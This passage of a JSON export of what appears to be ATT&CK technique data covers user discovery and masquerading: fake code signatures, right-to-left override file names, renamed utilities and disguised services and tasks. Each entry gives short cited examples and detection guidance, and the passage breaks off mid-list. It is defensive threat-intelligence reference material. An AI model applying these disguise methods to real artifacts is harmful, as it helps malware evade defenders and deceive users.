      "HAFNIUMhas usedwhoamito gather user information.[86]",
      "can collect the victim user name.[87]",
      "HAWKBALLcan collect the user name of the system.[88]",
      "HEXANEhas runwhoamion compromised machines to identify the current user.[89]",
      "HotCroissanthas the ability to collect the username on the infected host.[90]",
      "InvisiMolelists local users and session information.[91]",
      "Ixeshecollects the username from the victim’s machine.[92]",
      "JPINcan obtain the victim user name.[93]",
      "Kazuargathers information on users.[94]",
      "Ke3changhas used implants capable of collecting the signed-in username.[95]",
      "Koadiccan identify logged in users across the domain and views user sessions.[96][97]",
      "The OsInfo function inKomplexcollects the current running username.[98]",
      "KONNIcan collect the username from the victim’s machine.[99]",
      "KOPILUWAKcan conduct basic network reconnaissance on the victim machine withwhoami, to get user details.[100]",
      "Kwampirscollects registered owner details by using the commandssysteminfoandnet config workstation.[101]",
      "Latrodectuscan discover the username of an infected host.[102]",
      "VariousLazarus Groupmalware enumerates logged-on users.[103][104][105][106][107][49][108]",
      "Linux Rabbitopens a socket on port 22 and if it receives a response it attempts to obtain the machine's hostname and Top-Level Domain.[109]",
      "LiteDukecan enumerate the account name on a targeted system.[110]",
      "LitePowercan determine if the current user has admin privileges.[111]",
      "Lizarcan collect the username from the system.[112]",
      "Lokibothas the ability to discover the username on the infected host.[113]",
      "Luciferhas the ability to identify the username on a compromised host.[114]",
      "LuminousMothhas used a malicious DLL to collect the username from compromised hosts.[115]",
      "LunarWebcan collect user information from the targeted host.[116]",
      "MacMacan collect the username from the compromised machine.[117]",
      "Mafaldacan collect the username from a compromised host.[118]",
      "Magic Houndmalware has obtained the victim username and sent it to the C2 server.[119][120][121]",
      "Mangocan collect the user name from a compromised system which is used to create a unique victim identifier.[122]",
      "MarkiRATcan retrieve the victim’s username.[123]",
      "MechaFlounderhas the ability to identify the username and hostname on a compromised host.[124]",
      "metaMaincan collect the username from a compromised host.[118]",
      "Metamorfohas collected the username from the victim's machine.[125]",
      "MgBotincludes modules for identifying local users and administrators on victim machines.[126]",
      "Micropsiacollects the username from the victim’s machine.[127]",
      "Milancan identify users registered to a targeted machine.[128]",
      "MirageFoxcan gather the username from the victim’s machine.[129]",
      "Mis-Typeruns tests to determine the privilege level of the compromised user.[130]",
      "Moonstone Sleetdeployed various malware such as YouieLoader that can perform system user discovery actions.[131]",
      "MoonWindobtains the victim username.[132]",
      "More_eggshas the capability to gather the username from the victim's machine.[133][134]",
      "Mosquitorunswhoamion the victim’s machine.[135]",
      "MuddyWaterhas used malware that can collect the victim’s username.[136][137]",
      "NanHaiShucollects the username from the victim.[138]",
      "NBTscancan list active users on the system.[139][140]",
      "NDiskMonitorobtains the victim username and encrypts the information to send over its C2 channel.[141]",
      "Neoichorcan collect the user name from a victim's machine.[95]",
      "NGLitewill run thewhoamicommand to gather system information and return this to the command and control server.[142]",
      "DuringNight Dragon, threat actors used password cracking and pass-the-hash tools to discover usernames and passwords.[143]",
      "Nightdoorgathers information on victim system users and usernames.[144]",
      "njRATenumerates the current user during the initial infection.[145]",
      "NOKKIcan collect the username from the victim’s machine.[146]",
      "ObliqueRATcan check for blocklisted usernames on infected endpoints.[147]",
      "Octopuscan collect the username from the victim’s machine.[148]",
      "OilBoostercan identify the compromised system's username which is then used as part of a unique identifier.[149]",
      "OilRighas runwhoamion a victim.[150][151][152]",
      "Okrumcan collect the victim username.[153]",
      "DuringOperation CuckooBees, the threat actors used thequery userandwhoamicommands as part of their advanced reconnaissance.[154]",
      "DuringOperation Wocao, threat actors enumerated sessions and users on a remote host, and identified privileged users logged into a targeted system.[155]",
      "Patchworkcollected the victim username and whether it was running as admin, then sent the information to its C2 server.[156][141]",
      "PoetRATsent username, computer name, and the previously generated UUID in reply to a \"who\" command from C2.[157]",
      "PowerDukehas commands to get the current user's name and SID.[158]",
      "PowerShowerhas the ability to identify the current user on the infected host.[159]",
      "POWERSTATShas the ability to identify the username on the compromised host.[160]",
      "POWRUNERmay collect information about the currently logged in user by runningwhoamion a victim.[161]",
      "A module inPrikormkacollects information from the victim about the current user name.[162]",
      "Pupycan enumerate local information for Linux hosts and find currently logged on users for Windows hosts.[163]",
      "PyDCrypthas probed victim machines withwhoamiand has collected the username from the machine.[164]",
      "QakBotcan identify the user name on a compromised system.[165][166]",
      "QUADAGENTgathers the victim username.[167]",
      "QuasarRATcan enumerate the username and account type.[168]",
      "Raccoon Stealergathers information on the infected system owner and user.[169][170][171]",
      "Raspberry Robindetermines whether it is successfully running on a victim system by querying the running account information to determine if it is running in Session 0, indicating running with elevated privileges.[172]",
      "RATANKBAruns thewhoamiandquery usercommands.[173]",
      "RCSessioncan gather system owner information, including user and administrator privileges.[174]",
      "Reavercollects the victim's username.[175]",
      "RedLeavescan obtain information about the logged on user both locally and for Remote Desktop sessions.[176]",
      "Remseccan obtain information about the current user.[177]",
      "Revenge RATgathers the username from the system.[178]",
      "RGDoorexecutes thewhoamion the victim’s machine.[179]",
      "Rifdoorhas the ability to identify the username on the compromised host.[90]",
      "Rising Suncan detect the username of the infected host.[180]",
      "RogueRobincollects the victim’s username and whether that user is an admin.[181]",
      "ROKRATcan collect the username from a compromised host.[182]",
      "RTMcan obtain the victim username and permissions.[183]",
      "S-Typehas run tests to determine the privilege level of the compromised user.[130]",
      "Saint Botcan collect the username from a compromised host.[184]",
      "Sandworm Teamhas collected the username from a compromised host.[185]",
      "SDBbothas the ability to identify the user on a compromised host.[81]",
      "ServHelperwill attempt to enumerate the username of the victim.[186]",
      "ShadowPadhas collected the username of the victim system.[187]",
      "SHARPSTATShas the ability to identify the username on the compromised host.[160]",
      "SideTwistcan collect the username on a targeted system.[152]",
      "Sidewinderhas used tools to identify the user of a compromised host.[188]",
      "SILENTTRINITYcan gather a list of logged on users.[189]",
      "SLOTHFULMEDIAhas collected the username from a victim machine.[190]",
      "Small Sievecan obtain the id of a logged in user.[191]",
      "SMOKEDHAMhas usedwhoamicommands to identify system owners.[192]",
      "SocGholishcan usewhoamito obtain the username from a compromised host.[193][194][195]",
      "SodaMastercan identify the username on a compromised host.[196]",
      "SombRATcan executegetinfoto identify the username on a compromised host.[197][198]",
      "Sparkhas run the whoami command and has a built-in command to identify the user logged in.[199]",
      "SpeakUpuses thewhoamicommand.[200]",
      "Squirrelwafflecan collect the user name from a compromised host.[201]",
      "SslMMsends the logged-on username to its hard-coded C2.[202]",
      "STARWHALEcan gather the username from an infected host.[203][204]",
      "Stealth Falconmalware gathers the registered user and primary owner name via WMI.[205]",
      "Storm-1811has usedwhoami.exeto determine if the active user on a compromised system is an administrator.[206]",
      "StrifeWatercan collect the user name from the victim's machine.[207]",
      "SUNBURSTcollected the username from a compromised host.[208][209]",
      "SVCReadycan collect the username from an infected host.[210]",
      "SynAckgathers user names from infected hosts.[211]",
      "Sys10collects the account name of the logged-in user and sends it to the C2.[202]",
      "SysUpdatecan collect the username from a compromised host.[212]",
      "T9000gathers and beacons the username of the logged in account during installation. It will also gather the username of running processes to determine if it is running as SYSTEM.[213]",
      "Threat Group-3390has usedwhoamito collect system user information.[43]",
      "TrickBotcan identify the user and groups the user belongs to on a compromised host.[214]",
      "Trojan.Karaganycan gather information about the user on a compromised host.[215]",
      "Tropic Trooperusedletmeinto scan for saved usernames on the target system.[216]",
      "Turiancan retrieve usernames.[217]",
      "Unknown Loggercan obtain information about the victim usernames.[218]",
      "UPPERCUThas the capability to collect the current logged on user’s username from a machine.[219]",
      "Valakcan gather information regarding the user.[220]",
      "VERMINgathers the username from the victim’s machine.[221]",
      "Volt Typhoonhas used public tools and executed the PowerShell commandGet-EventLog security -instanceid 4624to identify associated user and computer account names.[222][223][224]",
      "WellMailcan identify the current username on the victim system.[225]",
      "WellMesscan collect the username on the victim machine to send to C2.[226]",
      "WINDSHIELDcan gather the victim user name.[227]",
      "Windshifthas used malware to identify the username on a compromised host.[228]",
      "WINERACKcan gather information on the victim username.[87]",
      "WinMMuses NetUser-GetInfo to identify that it is running under an \"Admin\" account on the local system.[202]",
      "Winter VivernPowerShell scripts executewhoamito identify the executing user.[229]",
      "Wizard Spiderhas used \"whoami\" to identify the local user and their privileges.[230]",
      "Woody RATcan retrieve a list of user accounts and usernames from an infected machine.[231]",
      "XAgentOSXcontains the getInfoOSX function to return the OS X version as well as the current user.[232]",
      "XLoadercan identify the username from a victim machine.[233]",
      "ytycollects the victim’s username.[234]",
      "Zebrocygets the username from the system.[235][236]",
      "ZIRCONIUMhas used a tool to capture the username on a compromised host in order to register it with C2.[237]",
      "zwShellcan obtain the name of the logged-in user on the victim.[143]",
      "ZxShellcan collect the owner and organization information from the target workstation.[238]",
      "ZxxZcan collect the username from a compromised host.[239]"
    ]
  },
  "T1036": {
    "Name": "Masquerading",
    "Description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.Renaming abusable system utilities to evade security monitoring is also a form ofMasquerading.[1]",
    "Detects": [
      "Monitor executed commands and arguments that may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools.[62]Note: For Windows, Event ID 4104 (from the Microsoft-Windows-Powershell/Operational log) captures Powershell script blocks, which can be analyzed and used to detect on potential Masquerading.",
      "Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Look for indications of common characters that may indicate an attempt to trick users into misidentifying the file type, such as a space as the last character of a file name or the right-to-left override characters\"\\u202E\", \"[U+202E]\", and \"%E2%80%AE\".Check and ensure that file headers/signature and extensions match using magic bytes detection and/or file signature validation.[63]In Linux, thefilecommand may be used to check the file signature.[64]",
      "Monitor for changes made to files outside of an update or patch that may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Windows Event ID 4663 (An Attempt Was Made to Access An Object) can be used to alert on attempted file accesses that may be associate with Masquerading.",
      "Collecting disk and resource filenames for binaries, comparing that the InternalName, OriginalFilename, and/or ProductName match what is expected, could provide useful leads but may not always be indicative of malicious activity.[65]",
      "Monitor for API calls such asfork()which can be abused to masquerade or manipulate process metadata.",
      "Monitor for newly executed processes that may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. The RECYCLER and SystemVolumeInformation directories will be present on every drive. Replace %systemroot% and %windir% with the actual paths as configured by the endpoints.Analytic 1 - Suspicious Run Locations(sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (sourcetype=\"WinEventLog:Security\" EventCode=\"4688\") AND ( Image=\":\\RECYCLER*\" OR  Image=\":\\SystemVolumeInformation*\" OR  Image=\"%windir%\\Tasks*\" OR  Image=\"%systemroot%\\debug*\")",
      "Monitor for file names that are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled.",
      "Monitor for contextual data about a scheduled job, which may include information such as name, timing, command(s), etc.On Windows, Event ID 4698 (Security Log - A scheduled task was created) can be used to alert on the creation of scheduled tasks and provides metadata including the task name and task content (as XML).On Linux, auditing frameworks such as the Linux Auditing System (auditd) can be used to alert on invocations of cron, and provides the metadata included when executing the command.",
      "Monitor for changes made to scheduled jobs that may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools.",
      "Monitor for newly constructed services/daemons that may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools.",
      "Monitor for contextual data about a service/daemon, which may include information such as name, service executable, start type, etc.",
      "Monitor for newly constructed accounts with names that are unusually generic or identical to recently-deleted accounts."
    ],
    "Procedure Examples": [
      "Agriusused the Plink tool for tunneling and connections to remote machines, renaming itsystems.exein some instances.[2]",
      "Aoqin Dragonhas used fake icons including antivirus and external drives to disguise malicious payloads.[3]",
      "AppleSeedcan disguise JavaScript files as PDFs.[4]",
      "APT28has renamed the WinRAR utility to avoid detection.[5]",
      "APT32has disguised a Cobalt Strike beacon as a Flash Installer.[6]",
      "ArcaneDoorinvolved the use of digital certificates on adversary-controlled network infrastructure that mimicked the formatting used by legitimate Cisco ASA appliances.[7]",
      "Bisonaldropped a decoy payload with a .jpg extension that contained a malicious Visual Basic script.[8]",
      "BoomBoxhas the ability to mask malicious data strings as PDF files.[9]",
      "BRONZE BUTLERhas masked executables with document file icons including Word and Adobe PDF.[10]",
      "DuringC0015, the threat actors named a binary filecompareForfor.jpgto disguise it as a JPG file.[11]",
      "DuringC0018,AvosLockerwas disguised using the victim company name as the filename.[12]",
      "TheDaclsMach-O binary has been disguised as a .nib file.[13]",
      "DarkGatecan masquerade as pirated media content for initial delivery to victims.[14]",
      "DarkTortilla's payload has been renamedPowerShellInfo.exe.[15]",
      "DarkWatchmanhas used an icon mimicking a text file to mask a malicious executable.[16]",
      "Ember Bearhas renamed the legitimate Sysinternals tool procdump to alternative names such asdump64.exeto evade detection.[17]",
      "EnvyScouthas used folder icons for malicious files to lure victims into opening them.[9]",
      "FatDukehas attempted to mimic a compromised user's traffic by using the same user agent as the installed browser.[18]",
      "FIN13has masqueraded staged data by using the Windowscertutilutility to generate fake Base64 encoded certificates with the input file.[19][20]",
      "Flagprocan download malicious files with a .tmp extension and append them with .exe prior to execution.[21]",
      "FoggyWebcan masquerade the output of C2 commands as a fake, but legitimately formatted WebP file.[22]",
      "KV Botnet Activityinvolves changing process filename topr_set_mm_exe_fileand process name topr_set_nameduring later infection stages.[23]",
      "LazyScripterhas used several different security software icons to disguise executables.[24]",
      "menuPasshas usedesentutlto change file extensions to their true type that were masquerading as .txt files.[25]",
      "Milanhas used an executable namedcompanycatalogueto appear benign.[26]",
      "NativeZonehas, upon execution, displayed a message box that appears to be related to a Ukrainian electronic document management system.[27]",
      "Nomadic Octopusattempted to makeOctopusappear as a  Telegram Messenger with a Russian interface.[28]",
      "NotPetyadropsPsExecwith the filename dllhost.dat.[29]",
      "OilRighas used .doc file extensions to mask malicious executables.[30]",
      "ForOperation Dust Storm, the threat actors disguised some executables as JPG files.[31]",
      "DuringOperation Honeybee, the threat actors modified the MaoCheng dropper so its icon appeared as a Word document.[32]",
      "PLATINUMhas renamed rar.exe to avoid detection.[33]",
      "Ponyhas used the Adobe Reader icon for the downloaded file to look more trustworthy.[34]",
      "PowGoophas disguised a PowerShell script as a .dat file (goopdate.dat).[35]",
      "Raindropwas built to include a modified version of 7-Zip source code (including associated export names) and Far Manager source code.[36][37]",
      "Ramsayhas masqueraded as a JPG image file.[38]",
      "RCSessionhas used a file named English.rtf to appear benign on victim hosts.[39][40]",
      "RTMhas been delivered as archived Windows executable files masquerading as PDF documents.[41]",
      "Ryukcan create .dll files that actually contain a Rich Text File format document.[42]",
      "Saint Bothas renamed malicious binaries aswallpaper.mp4andslideshow.mp4to avoid detection.[43][44]",
      "Sandworm Teammasqueraded malicious installers as Windows update packages to evade defense and entice users to execute binaries.[45]",
      "SombRATcan use a legitimate process name to hide itself.[46]",
      "Storm-1811has prompted users to download and execute batch scripts that masquerade as legitimate update files during initial access and social engineering operations.[47]",
      "StrelaStealerPE executable payloads have used uncommon but legitimate extensions such as.cominstead of.exe.[48]",
      "TA551has masked malware DLLs as dat and jpg files.[49]",
      "TeamTNThas disguised their scripts with docker-related file names.[50]",
      "TrailBlazerhas used filenames that match the name of the compromised system in attempt to avoid detection.[51]",
      "TheTrickBotdownloader has used an icon to appear as a Microsoft Word document.[52]",
      "UPSTYLEhas masqueraded filenames using examples such asupdate.py.[53]",
      "WhisperGatehas been disguised as a JPG extension to avoid detection as a malicious PE file.[54]",
      "Windshifthas used icons mimicking MS Office files to mask malicious executables.[55]Windshifthas also attempted to hide executables by changing the file extension to \".scr\" to mimic Windows screensavers.[56]",
      "WindTailhas used icons mimicking MS Office files to mask payloads.[55]",
      "Winter Viverncreated specially-crafted documents mimicking legitimate government or similar documents during phishing campaigns.[57]",
      "XCSSETinstalls malicious application bundles that mimic native macOS apps, such as Safari, by using the legitimate app’s icon and customizing theInfo.plistto match expected metadata.[58][59]",
      "ZIRCONIUMhas spoofed legitimate applications in phishing lures and changed file extensions to conceal  installation of malware.[60][61]"
    ]
  },
  "T1036.001": {
    "Name": "Masquerading:Invalid Code Signature",
    "Description": "Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.[1]UnlikeCode Signing, this activity will not result in a valid signature.",
    "Detects": [
      "Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment, look for invalid signatures as well as unusual certificate characteristics and outliers."
    ],
    "Procedure Examples": [
      "APT37has signed its malware with an invalid digital certificates listed as \"Tencent Technology (Shenzhen) Company Limited.\"[2]",
      "BADNEWSis sometimes signed with an invalid Authenticode certificate in an apparent effort to make it look more legitimate.[3]",
      "Gelsemiumhas used unverified signatures on malicious DLLs.[4]",
      "TheNETWIREclient has been signed by fake and invalid digital certificates.[5]",
      "PcSharehas used an invalid certificate in attempt to appear legitimate.[6]",
      "Reginstage 1 modules for 64-bit systems have been found to be signed with fake certificates masquerading as originating from Microsoft Corporation and Broadcom Corporation.[7]",
      "Windshifthas used revoked certificates to sign malware.[8][9]",
      "WindTailhas been incompletely signed with revoked certificates.[8]"
    ]
  },
  "T1036.002": {
    "Name": "Masquerading:Right-to-Left Override",
    "Description": "Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable namedMarch 25 \\u202Excod.scrwill display asMarch 25 rcs.docx. A JavaScript file namedphoto_high_re\\u202Egnp.jswill be displayed asphoto_high_resj.png.[1]Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is withSpearphishing Attachment/Malicious Filesince it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.[2][3]RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",
    "Detects": [
      "Monitor for common formats of RTLO characters within filenames such as \\u202E, [U+202E], and %E2%80%AE. Defenders should also check their analysis tools to ensure they do not interpret the RTLO character and instead print the true name of the file containing it."
    ],
    "Procedure Examples": [
      "BlackTechhas used right-to-left-override to obfuscate the filenames of malicious e-mail attachments.[4]",
      "BRONZE BUTLERhas used Right-to-Left Override to deceive victims into executing several strains of malware.[5]",
      "Ferocious Kittenhas used right-to-left override to reverse executables’ names to make them appear to have different file extensions, rather than their real ones.[6]",
      "Ke3changhas used the right-to-left override character in spearphishing attachment names to trick targets into executing .scr and .exe files.[7]",
      "Scarlet Mimichas used the left-to-right override character in self-extracting RAR archive spearphishing attachment file names.[8]"
    ]
  },
  "T1036.003": {
    "Name": "Masquerading:Rename Legitimate Utilities",
    "Description": "Adversaries may rename legitimate / system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for legitimate utilities adversaries are capable of abusing, including both built-in binaries and tools such as PSExec, AutoHotKey, and IronPython.[1][2][3][4]It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: renamerundll32.exe).[5]An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on these utilities executing from non-standard paths.[6]",
    "Detects": [
      "Monitor executed commands and arguments that may rename legitimate / system utilities to try to evade security mechanisms concerning the usage of those utilities.",
      "Collecting and comparing disk and resource filenames for binaries by looking to see if theInternalName,OriginalFilename, and/orProductNamematch what is expected could provide useful leads, but may not always be indicative of malicious activity.",
      "Monitor for unexpected modifications to file names that are mismatched between the file name on disk and that of the binary's PE metadata. This is a likely indicator that a binary was renamed after it was compiled.Note: There are no standard Windows events for file modification. However, Event ID 4663 (An attempt was made to access an object) can be used to audit and alert on attempts to access system utility binaries; the \"Accesses\" field can be used to filter by type of access (e.g.,MODIFYvsDELETE).",
      "Monitor for file names that are mismatched between the file name on disk and that of the binary's PE metadata. This is a likely indicator that a binary was renamed after it was compiled."
    ],
    "Procedure Examples": [
      "APT32has moved and renamed pubprn.vbs to a .txt file to avoid detection.[7]",
      "APT38has renamed system utilities, such asrundll32.exeandmshta.exe, to avoid detection.[8]",
      "TheCozyCardropper has masqueraded a copy of the infected system's rundll32.exe executable that was moved to the malware's install directory and renamed according to a predefined configuration file.[6]",
      "Daggerflyused a renamed version of rundll32.exe, such as \"dbengin.exe\" located in theProgramData\\Microsoft\\PlayReadydirectory, to proxy malicious DLL execution.[9]",
      "DarkGateexecutes a Windows Batch script during installation that creases a randomly-named directory in theC:\\root directory that copies and renames the legitimate Windowscurlcommand to this new location.[10]",
      "GALLIUMused a renamed cmd.exe file to evade detection.[11]",
      "Kevinhas renamed an image ofcmd.exewith a random name followed by a.tmplextension.[12]",
      "Lazarus Grouphas renamed system utilities such aswscript.exeandmshta.exe.[13]",
      "menuPasshas renamedcertutiland moved it to a different location on the system to avoid detection based on use of the tool.[14]",
      "StrelaStealerhas used a renamed, legitimatemsinfo32.exeexecutable to sideload theStrelaStealerpayload during initial installation.[15]"
    ]
  },
  "T1036.004": {
    "Name": "Masquerading:Masquerade Task or Service",
    "Description": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.[1][2]Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.[3][4]",
    "Detects": [
      "Monitor executed commands and arguments that may attempt to manipulate the name of a task or service to make it appear legitimate or benign.",
      "Monitor for contextual data about a scheduled job, which may include information such as name, timing, command(s), etc.",
      "Monitor for changes made to scheduled jobs for unexpected modifications to execution launch",
      "Monitor for newly constructed services/daemons. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
      "Monitor for changes made to services for unexpected modifications to names, descriptions, and/or start types"
    ],
    "Procedure Examples": [
      "During the2022 Ukraine Electric Power Attack,Sandworm Teamleveraged Systemd service units to masquerade GOGETTER malware as legitimate or seemingly legitimate services.[5]",
      "APT-C-36has disguised its scheduled tasks as those used by Google.[6]",
      "APT32has used hidden or non-printing characters to help masquerade service names, such as appending a Unicode no-break space character to a legitimate service name.APT32has also impersonated the legitimate Flash installer file name \"install_flashplayer.exe\".[7]",
      "APT41has created services to appear as benign system tools.[8]",
      "APT41 DUSTdisguisedDUSTPANas a legitimate Windows binary such asw3wp.exeorconn.exe.[9]",
      "Aquatic Pandacreated new, malicious services using names such asWindows User Serviceto attempt to blend in with legitimate items on victim systems.[10]",
      "Attor's dispatcher disguises itself as a legitimate task (i.e., the task name and description appear legitimate).[11]",
      "BackdoorDiplomacyhas disguised their backdoor droppers with naming conventions designed to blend into normal operations.[12]",
      "Bazarcan create a task named to appear benign.[13]",
      "BITTERhas disguised malware as a Windows Security update service.[14]",
      "Black Bastahas established persistence by creating a new service namedFAXafter deleting the legitimate service by the same name.[15][16][17]",
      "build_downerhas added itself to the Registry Run key as \"NVIDIA\" to appear legitimate.[18]",
      "DuringC0017,APT41usedSCHTASKS  /Changeto modify legitimate scheduled tasks to run malicious code.[19]",
      "Carbanakhas copied legitimate service names to use for malicious services.[20]",
      "Catchamasadds a new service named NetAdapter in an apparent attempt to masquerade as a legitimate service.[21]",
      "ComRAThas used a task name associated with Windows SQM Consolidator.[22]",
      "Crutchhas established persistence with a scheduled task impersonating the Outlook item finder.[23]",
      "CSPY Downloaderhas attempted to appear as a legitimate Windows service with a fake description claiming it is used to support packed applications.[24]",
      "DCSrvhas masqueraded its service as a legitimate svchost.exe process.[25]",
      "DEADEYEhas usedschtasks /changeto modify scheduled tasks including\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor,\\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and\\Microsoft\\Windows\\WDI\\USOShared.[19]",
      "DEADWOODwill attempt to masquerade its service execution using benign-looking names such asScDeviceEnums.[26]",
      "Egregorhas masqueraded the svchost.exe process to exfiltrate data.[27]",
      "Emotethas installed itself as a new service with the service nameWindows Defender System Serviceand display nameWinDefService.[28]",
      "TheExaramel for Windowsdropper creates and starts a Windows service named wsmprovav with the description \"Windows Check AV\" in an apparent attempt to masquerade as a legitimate service.[29]",
      "FIN13has used scheduled tasks names such asacrotyrandAppServicesrto mimic the same names in a compromised network'sC:\\Windowsdirectory.[30]",
      "FIN6has renamed the \"psexec\" service name to \"mstdc\" to masquerade as a legitimate Windows service.[31]",
      "FIN7has created a scheduled task named \"AdobeFlashSync\" to establish persistence.[32]",
      "Fox Kittenhas named the task for a reverse proxy lpupdate to appear legitimate.[33]",
      "DuringFrankenstein, the threat actors named a malicious scheduled task \"WinUpdate\" for persistence.[34]",
      "FunnyDreamhas used a service namedWSearchfor execution.[35]",
      "Fysbishas masqueraded as the rsyncd and dbus-inotifier services.[4]",
      "GoldMaxhas impersonated systems management software to avoid detection.[36]",
      "Green Lamberthas created a new executable namedSoftware Update Checkto appear legitimate.[37][38]",
      "Heyoka Backdoorhas been namedsrvdll.dllto appear as a legitimate service.[39]",
      "Higaisanamed a shellcode loader binarysvchast.exeto spoof the legitimatesvchost.exe.[40][41]",
      "Hildegardhas disguised itself as a known Linux process.[42]",
      "InnaputRATvariants have attempted to appear legitimate by adding a new service named OfficeUpdateService.[43]",
      "InvisiMolehas attempted to disguise itself by registering under a seemingly legitimate service name.[44]",
      "IronNetInjectorhas been disguised as a legitimate service using the name PythonUpdateSrvc.[45]",
      "KillDiskregisters as a service under the Plug-And-Play Support name.[46]",
      "Kimsukyhas disguised services to appear as benign software or related to operating system functions.[47]",
      "KONNIhas pretended to be the xmlProv Network Provisioning service.[48]",
      "KV Botnet Activityinstallation steps include first identifying, then stopping, any process containing[kworker\\/0:1], then renaming its initial installation stage to this process name.[49]",
      "Kwampirsestablishes persistence by adding a new service with the display name \"WMI Performance Adapter Extension\" in an attempt to masquerade as a legitimate WMI service.[50]",
      "Lazarus Grouphas used a scheduled task namedSRCheckto mask the execution of a malicious .dll.[51]",
      "Macheterenamed task names to masquerade as legitimate Google Chrome, Java, Dropbox, Adobe Reader and Python tasks.[52]",
      "Magic Houndhas named a malicious script CacheTask.bat to mimic a legitimate task.[53]",
      "Mazeoperators have created scheduled tasks masquerading as \"Windows Update Security\", \"Windows Update Security Patches\", and \"Google Chrome Security Update\" designed to launch the ransomware.[54]",
      "Meteorhas been disguised as the Windows Power Efficiency Diagnostics report tool.[55]",
      "Naikonrenamed a malicious servicetaskmgrto appear to be a legitimate version of Task Manager.[56]",
      "Nebulaehas created a service named \"Windows Update Agent1\" to appear legitimate.[56]",
      "Nidirancan create a new service named msamger (Microsoft Security Accounts Manager), which mimics the legitimate Microsoft database by the same name.[57][58]",
      "NightClubhas created a service namedWmdmPmSpto spoof a Windows Media service.[59]",
      "Okrumcan establish persistence by adding a new service NtmsSvc with the display name Removable Storage to masquerade as a legitimate Removable Storage Manager.[60]",
      "OSX_OCEANLOTUS.Duses file naming conventions with associated executable locations to blend in with the macOS TimeMachine and OpenSSL services. Such as, naming a LaunchAgent plist filecom.apple.openssl.plistwhich executesOSX_OCEANLOTUS.Dfrom the user's~/Library/OpenSSL/folder upon user login.[61]",
      "PingPullcan mimic the names and descriptions of legitimate services such asiphlpsvc,IP Helper,  andOnedriveto evade detection.[62]",
      "In one instance,menuPassaddedPlugXas a service with a display name of \"Corel Writing Tools Utility.\"[63]",
      "POWERSTATShas created a scheduled task named \"MicrosoftEdge\" to establish persistence.[64]",
      "PROMETHIUMhas named services to appear legitimate.[65][66]",
      "RainyDayhas named services and scheduled tasks to appear benign including \"ChromeCheck\" and \"googleupdate.\"[56]",
      "Raspberry Robinwill execute its payload prior to initializing command and control traffic by impersonating one of several legitimate program names such as dllhost.exe, regsvr32.exe, or rundll32.exe.[67]",
      "New services created byRawPOSare made to appear like legitimate Windows services, with names such as \"Windows Management Help Service\", \"Microsoft Support\", and \"Windows Advanced Task Manager\".[68][69][70]",
      "RDAThas used Windows Video Service as a name for malicious services.[71]",
      "Mustang Pandamasqueraded Registry run keys as legitimate-looking service names such asOneNote UpdateduringRedDelta Modified PlugX Infection Chain Operations.[72]",
      "RTMhas named the scheduled task it creates \"Windows Update\".[73]",
      "Seasalthas masqueraded as a service called \"SaSaut\" with a display name of \"System Authorization Service\" in an apparent attempt to masquerade as a legitimate service.[74]",
      "Shamooncreates a new service named \"ntssrv\" that attempts to appear legitimate; the service's display name is \"Microsoft Network Realtime Inspection Service\" and its description is \"Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols.\" Newer versions create the \"MaintenaceSrv\" service, which misspells the word \"maintenance.\"[3][75]",
      "ShimRatcan impersonate Windows services and antivirus products to avoid detection on compromised systems.[76]",
      "SLOTHFULMEDIAhas named a service it establishes on victim machines as \"TaskFrame\" to hide its malicious purpose.[77]",
      "During theSolarWinds Compromise,APT29named tasks\\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManagerin order to appear legitimate.[78]",
      "Spicahas created a scheduled task namedCalendarCheckerfor persistence on compromised hosts.[79]",
      "StrongPityhas named services to appear legitimate.[65][66]",
      "SUGARDUMP's scheduled task has been namedMicrosoftInternetExplorerCrashRepoeterTaskMachineUAorMicrosoftEdgeCrashRepoeterTaskMachineUA, depending on the Windows OS version.[80]",
      "SVCReadyhas named a taskRecoveryExTaskas part of its persistence activity.[81]",
